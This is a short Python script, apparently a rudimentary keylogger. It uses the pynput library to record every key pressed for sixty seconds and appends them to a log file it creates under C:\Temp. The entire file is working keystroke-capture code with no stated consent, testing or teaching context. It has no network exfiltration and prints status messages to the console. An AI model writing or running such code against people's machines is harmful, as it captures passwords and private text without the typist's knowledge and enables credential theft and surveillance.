import time
import random
from pynput.keyboard import Listener, Key
import os
from datetime import datetime


# 8/13/2025
# Listen to keys
# AUX-441


class get_key:

    def get_key(self, key):
        path = "C:\\Temp"
        file = "logs.txt"
        full = os.path.join(path, file)

        if not os.path.exists(path):
            os.makedirs(path)
            print("Directory Created Successfully ..")

        if not os.path.exists(full):
            open(full, "w", encoding="utf-8").close()
            time.sleep(random.randint(1,3))
            print("File Created Successfully ..")

        with open(full, "a", encoding="utf-8") as f:
            if key == Key.space:
                f.write("\n\n Space Pressed")
            elif key == Key.enter:
                f.write("\n Enter Pressed")
            else:
                f.write(str(key))

    def start(self):
        with Listener(on_press=self.get_key) as listener:
            listener.join(timeout=60)



if __name__ == "__main__":
    gk = get_key()
    gk.start()


